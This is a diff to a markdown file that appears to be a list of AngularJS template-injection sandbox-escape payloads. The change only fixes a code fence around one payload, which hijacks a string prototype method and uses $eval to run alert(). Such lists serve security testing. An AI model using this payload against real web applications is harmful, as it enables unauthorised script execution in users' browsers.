@@ -160,7 +160,8 @@ As literal object:
 ```
 
 As Array: 
-```{{x = [''.constructor.prototype]; x[0].charAt=[].join; $eval('x=alert(Evaluated Array)');}}
+```
+{{x = [''.constructor.prototype]; x[0].charAt=[].join; $eval('x=alert(Evaluated Array)');}}
 ```
 
 **Versions 1.3.0 - 1.5.7:**
